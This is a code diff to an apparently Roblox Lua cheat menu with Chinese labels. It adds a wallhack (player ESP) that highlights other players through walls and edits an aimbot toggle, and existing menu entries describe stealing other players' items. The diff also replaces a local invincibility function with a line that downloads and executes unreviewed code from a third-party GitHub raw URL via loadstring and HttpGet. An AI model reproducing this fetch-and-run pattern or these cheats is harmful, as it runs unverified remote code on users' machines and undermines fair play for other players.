@@ -286,9 +286,10 @@ local function loadScript()
             {name = "AntiFallButton", text = "防摔(多点几次)", desc = "防止从高处掉落受伤"},
             {name = "SuicideButton", text = "自杀", desc = "立即死亡"},
             {name = "FlyButton", text = "飞行v2 [关闭]", desc = "点击开启/关闭飞行模式"},
-            {name = "InvincibleButton", text = "无敌 [关闭]", desc = "开启无敌模式"},
+            {name = "InvincibleButton", text = "无敌", desc = "加载无敌脚本"},
             {name = "CollisionBoxButton", text = "显示碰撞箱 [关闭]", desc = "显示物体碰撞箱"},
-            {name = "WalkAirButton", text = "踏空行走 [关闭]", desc = "在空中行走"}
+            {name = "WalkAirButton", text = "踏空行走 [关闭]", desc = "在空中行走"},
+            {name = "PlayerESPButton", text = "透视玩家 [关闭]", desc = "透视显示其他玩家轮廓"}
         },
         ["移动功能"] = {
             {name = "SpinButton", text = "人物旋转 [关闭]", desc = "让人物持续旋转"},
@@ -302,7 +303,7 @@ local function loadScript()
             {name = "RideHeadButton", text = "骑在玩家头上 [关闭]", desc = "骑在目标玩家头上跟随移动"},
             {name = "ViewBackpackButton", text = "查看玩家背包", desc = "查看并偷取其他玩家的物品"},
             {name = "ClickTeleportButton", text = "点击传送", desc = "加载点击传送工具脚本"},
-            {name = "AimbotButton", text = "可关闭的自瞄 [关闭]", desc = "自动瞄准最近玩家，可选头部/身体"}
+            {name = "AimbotButton", text = "自瞄 [关闭]", desc = "自动瞄准最近玩家，可选头部/身体"}
         },
         ["外观功能"] = {
             {name = "PlayerSizeButton", text = "玩家大小: 1", desc = "调整玩家体型大小"},
@@ -426,8 +427,8 @@ local function loadScript()
             {name = "ForsakenScript2Button", text = "被遗弃脚本二", desc = "加载被遗弃脚本二"}
         },
         ["无敌少侠飞行"] = {
-            {name = "InvincibleFlyR15Button", text = "无敌少侠飞行r15 [关闭]", desc = "R15角色无敌飞行模式"},
-            {name = "InvincibleFlyR6Button", text = "无敌少侠飞行r6 [关闭]", desc = "R6角色无敌飞行模式"}
+            {name = "InvincibleFlyR15Button", text = "无敌少侠飞行r15", desc = "R15角色无敌飞行模式"},
+            {name = "InvincibleFlyR6Button", text = "无敌少侠飞行r6", desc = "R6角色无敌飞行模式"}
         },
         ["搜索功能"] = {
             -- 搜索功能将在后面特殊处理
@@ -658,8 +659,8 @@ local function loadScript()
     SearchContent.Visible = false
 
     -- 功能变量
-    local noclip, infiniteJump, spinning, walkAir, flying, invincible, showCollision = false, false, false, false, false, false, false
-    local rainbow, globalRainbow, ghost, sitSpinning, ridingHead = false, false, false, false, false
+    local noclip, infiniteJump, spinning, walkAir, flying, showCollision = false, false, false, false, false, false
+    local rainbow, globalRainbow, ghost, sitSpinning, ridingHead, playerESPEnabled = false, false, false, false, false, false
     local climbing, autoMove, nightVision, aimbotEnabled = false, false, false, false
     local walkSpeed, jumpPower, spinSpeed, playerSize, gravity, sitSpinSpeed = 16, 50, 10, 1, 196.2, 5
     local selectedPlayer = nil
@@ -668,6 +669,7 @@ local function loadScript()
     local originalLightingSettings = {}
     local aimbotTarget = nil
     local aimToHead = true -- 默认瞄准头部
+    local espHighlights = {} -- 存储透视高亮对象
 
     -- 播放点击音效函数
     local function playClickSound()
@@ -877,7 +879,7 @@ local function loadScript()
         aimbotEnabled = not aimbotEnabled
         
         if aimbotEnabled then
-            ButtonInstances.AimbotButton.Text = "可关闭的自瞄 [开启]"
+            ButtonInstances.AimbotButton.Text = "自瞄 [开启]"
             ButtonInstances.AimbotButton.TextColor3 = Color3.fromRGB(0, 255, 150)
             
             -- 自瞄逻辑
@@ -925,7 +927,7 @@ local function loadScript()
             
             showNotification("自瞄已开启 (瞄准" .. (aimToHead and "头部" or "身体") .. ")", Color3.fromRGB(0, 200, 0))
         else
-            ButtonInstances.AimbotButton.Text = "可关闭的自瞄 [关闭]"
+            ButtonInstances.AimbotButton.Text = "自瞄 [关闭]"
             ButtonInstances.AimbotButton.TextColor3 = Color3.fromRGB(200, 200, 255)
             
             if connections.aimbot then
@@ -934,6 +936,96 @@ local function loadScript()
             end
             
             showNotification("自瞄已关闭", Color3.fromRGB(150, 150, 150))
+        end
+    end
+
+    -- 透视玩家功能
+    local function togglePlayerESP()
+        playClickSound()
+        playerESPEnabled = not playerESPEnabled
+        
+        if playerESPEnabled then
+            ButtonInstances.PlayerESPButton.Text = "透视玩家 [开启]"
+            ButtonInstances.PlayerESPButton.TextColor3 = Color3.fromRGB(0, 255, 150)
+            
+            -- 为所有玩家创建高亮
+            local function createESP(player)
+                if player ~= LocalPlayer and player.Character then
+                    local highlight = Instance.new("Highlight")
+                    highlight.Name = "BaconESP"
+                    highlight.FillColor = Color3.fromRGB(255, 0, 0)
+                    highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
+                    highlight.FillTransparency = 0.5
+                    highlight.OutlineTransparency = 0
+                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                    highlight.Adornee = player.Character
+                    highlight.Parent = player.Character
+                    espHighlights[player] = highlight
+                end
+            end
+            
+            -- 为现有玩家创建ESP
+            for _, player in pairs(Players:GetPlayers()) do
+                createESP(player)
+            end
+            
+            -- 监听新玩家加入
+            connections.playerAddedESP = Players.PlayerAdded:Connect(function(player)
+                createESP(player)
+            end)
+            
+            -- 监听玩家离开
+            connections.playerRemovingESP = Players.PlayerRemoving:Connect(function(player)
+                if espHighlights[player] then
+                    espHighlights[player]:Destroy()
+                    espHighlights[player] = nil
+                end
+            end)
+            
+            -- 监听玩家角色变化
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    connections[player] = player.CharacterAdded:Connect(function(character)
+                        if playerESPEnabled then
+                            wait(0.5)
+                            createESP(player)
+                        end
+                    end)
+                end
+            end
+            
+            showNotification("透视玩家已开启", Color3.fromRGB(0, 200, 0))
+        else
+            ButtonInstances.PlayerESPButton.Text = "透视玩家 [关闭]"
+            ButtonInstances.PlayerESPButton.TextColor3 = Color3.fromRGB(200, 200, 255)
+            
+            -- 移除所有高亮
+            for player, highlight in pairs(espHighlights) do
+                if highlight then
+                    highlight:Destroy()
+                end
+            end
+            espHighlights = {}
+            
+            -- 断开连接
+            if connections.playerAddedESP then
+                connections.playerAddedESP:Disconnect()
+                connections.playerAddedESP = nil
+            end
+            
+            if connections.playerRemovingESP then
+                connections.playerRemovingESP:Disconnect()
+                connections.playerRemovingESP = nil
+            end
+            
+            for player, connection in pairs(connections) do
+                if type(player) == "userdata" and player:IsA("Player") then
+                    connection:Disconnect()
+                    connections[player] = nil
+                end
+            end
+            
+            showNotification("透视玩家已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
@@ -1963,41 +2055,11 @@ print("安全版自然灾害免疫已激活")
         end
     end
 
-    -- 无敌功能
-    local function toggleInvincible()
+    -- 无敌功能（加载外部脚本）
+    local function loadInvincibleScript()
         playClickSound()
-        invincible = not invincible
-        
-        if invincible then
-            ButtonInstances.InvincibleButton.Text = "无敌 [开启]"
-            ButtonInstances.InvincibleButton.TextColor3 = Color3.fromRGB(0, 255, 150)
-            
-            local character = LocalPlayer.Character
-            if character then
-                local humanoid = character:FindFirstChildOfClass("Humanoid")
-                if humanoid then
-                    humanoid.Health = humanoid.MaxHealth
-                    humanoid.MaxHealth = math.huge
-                    humanoid.Health = math.huge
-                end
-            end
-            
-            showNotification("无敌模式已开启", Color3.fromRGB(0, 200, 0))
-        else
-            ButtonInstances.InvincibleButton.Text = "无敌 [关闭]"
-            ButtonInstances.InvincibleButton.TextColor3 = Color3.fromRGB(200, 200, 255)
-            
-            local character = LocalPlayer.Character
-            if character then
-                local humanoid = character:FindFirstChildOfClass("Humanoid")
-                if humanoid then
-                    humanoid.MaxHealth = 100
-                    humanoid.Health = 100
-                end
-            end
-            
-            showNotification("无敌模式已关闭", Color3.fromRGB(150, 150, 150))
-        end
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/5twh2hsf9j-byte/BowenPrime67/refs/heads/main/Python"))()
+        showNotification("无敌脚本已加载!", Color3.fromRGB(0, 200, 0))
     end
 
     -- 踏空行走功能
@@ -2202,9 +2264,10 @@ print("安全版自然灾害免疫已激活")
         AntiFallButton = loadAntiFall,
         SuicideButton = suicide,
         FlyButton = toggleFlyV2,
-        InvincibleButton = toggleInvincible,
+        InvincibleButton = loadInvincibleScript,
         CollisionBoxButton = toggleCollisionBox,
         WalkAirButton = toggleWalkAir,
+        PlayerESPButton = togglePlayerESP,
         
         -- 移动功能
         SpinButton = toggleSpin,
